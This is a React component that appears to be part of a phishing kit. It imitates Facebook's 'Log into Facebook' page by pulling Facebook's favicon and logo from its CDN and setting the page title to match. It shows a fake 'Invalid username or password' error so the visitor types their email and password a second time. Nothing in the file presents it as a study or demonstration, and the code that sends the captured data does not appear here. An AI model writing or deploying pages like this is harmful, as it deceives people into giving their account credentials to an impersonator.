import React, { useEffect, useState, useRef } from 'react'
import Footer from './Footer'
import './LoginFail.scss'

export default function LoginFail() {
  const errorSectionRef = useRef(null)

  useEffect(() => {
    const favicon = document.getElementById('favicon')
    favicon.href = 'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'

    document.title = 'Log into Facebook | Facebook'

    document.body.style.overflowY = 'hidden'
    document.documentElement.scrollTop = 0
  }, [])

  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')

  useEffect(() => {
    setTimeout(() => {
      errorSectionRef.current.style.display = 'none'
    }, 4000)
  }, [])

  return (
    <>
      <div className='loginFail'>
        <img
          src='https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg'
          alt='Facebook Logo'
          className='loginFail__logo'
        />

        <div className='loginFail__form__container'>
          <form className='loginFail__form'>
            <h4>Log Into Facebook</h4>

            <div className='loginFail__form__error' ref={errorSectionRef}>
              <h6>Wrong Credentails</h6>
              <p>Invalid username or password</p>
            </div>

            <input type='text' placeholder='Email' value={email} onChange={(e) => setEmail(e.target.value)} />
            <input type='text' placeholder='Password' value={password} onChange={(e) => setPassword(e.target.value)} />
            <button type='submit' className='loginFail__form__button'>
              Log In
            </button>
            <p className='loginFail__form__text'>Forgot Password?</p>

            <div className='loginFail__lines'>
              <div className='loginFail__line loginFail__line__one'></div>
              <p className='loginFail__line__text'>or</p>
              <div className='loginFail__line loginFail__line__two'></div>
            </div>

            <button className='loginFail__google'>Login With Google</button>
          </form>
        </div>
      </div>
      <Footer isLoginFooter />
    </>
  )
}
